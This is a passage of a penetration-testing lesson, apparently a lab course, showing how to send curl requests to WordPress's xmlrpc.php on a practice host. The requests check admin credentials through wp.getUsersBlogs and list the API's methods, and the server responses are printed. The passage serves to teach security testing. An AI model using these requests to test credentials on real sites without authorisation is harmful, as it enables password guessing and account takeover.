+  <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>url<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>http://blog.inlanefreight.com/<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>blogid<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>blogName<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>Inlanefreight<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>xmlrpc<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>http://blog.inlanefreight.com/xmlrpc.php<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">struct</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">methodResponse</span>&gt;</span>
+</code></pre>
+<p>Above, you can see a successful login attempt through <code>xmlrpc.php</code>.</p>
+<p>We will receive a <code>403 faultCode</code> error if the credentials are not valid.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -X POST -d "<span class="hljs-tag">&lt;<span class="hljs-name">methodCall</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>WRONG-PASSWORD<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">params</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">methodCall</span>&gt;</span>" http://blog.inlanefreight.com/xmlrpc.php
+
+<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-tag">&lt;<span class="hljs-name">methodResponse</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">fault</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">struct</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span>
+          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>faultCode<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+          <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>403<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">member</span>&gt;</span>
+          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>faultString<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
+          <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>Incorrect username or password.<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">member</span>&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">struct</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">fault</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">methodResponse</span>&gt;</span>
+</code></pre>
+<p>You may ask how we identified the correct method to call (<em>system.listMethods</em>). We did that by going through the well-documented <a href="https://codex.wordpress.org/XML-RPC/system.listMethods">Wordpress code</a> and interacting with <code>xmlrpc.php</code>, as follows.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s -X POST -d "<span class="hljs-tag">&lt;<span class="hljs-name">methodCall</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>system.listMethods<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">methodCall</span>&gt;</span>" http://blog.inlanefreight.com/xmlrpc.php
+
+<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-tag">&lt;<span class="hljs-name">methodResponse</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">params</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">param</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>system.multicall<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>system.listMethods<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>system.getCapabilities<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>demo.addTwoNumbers<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>demo.sayHello<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>pingback.extensions.getPingbacks<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>pingback.ping<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>mt.publishPost<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>mt.getTrackbackPings<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>mt.supportedTextFilters<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>mt.supportedMethods<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>mt.setPostCategories<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>mt.getPostCategories<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>mt.getRecentPostTitles<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>mt.getCategoryList<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>metaWeblog.getUsersBlogs<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>metaWeblog.deletePost<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>metaWeblog.newMediaObject<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>metaWeblog.getCategories<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>metaWeblog.getRecentPosts<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>metaWeblog.getPost<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>metaWeblog.editPost<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>metaWeblog.newPost<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>blogger.deletePost<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>blogger.editPost<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>blogger.newPost<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>blogger.getRecentPosts<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>blogger.getPost<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>blogger.getUserInfo<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>blogger.getUsersBlogs<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.restoreRevision<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getRevisions<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getPostTypes<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getPostType<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getPostFormats<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getMediaLibrary<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getMediaItem<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getCommentStatusList<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.newComment<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.editComment<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.deleteComment<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getComments<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getComment<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.setOptions<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getOptions<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getPageTemplates<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getPageStatusList<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getPostStatusList<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getCommentCount<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.deleteFile<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.uploadFile<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.suggestCategories<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.deleteCategory<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.newCategory<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getTags<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getCategories<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getAuthors<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getPageList<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.editPage<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.deletePage<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.newPage<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getPages<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getPage<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.editProfile<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getProfile<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getUsers<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getUser<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getTaxonomies<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getTaxonomy<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getTerms<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>wp.getTerm<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>
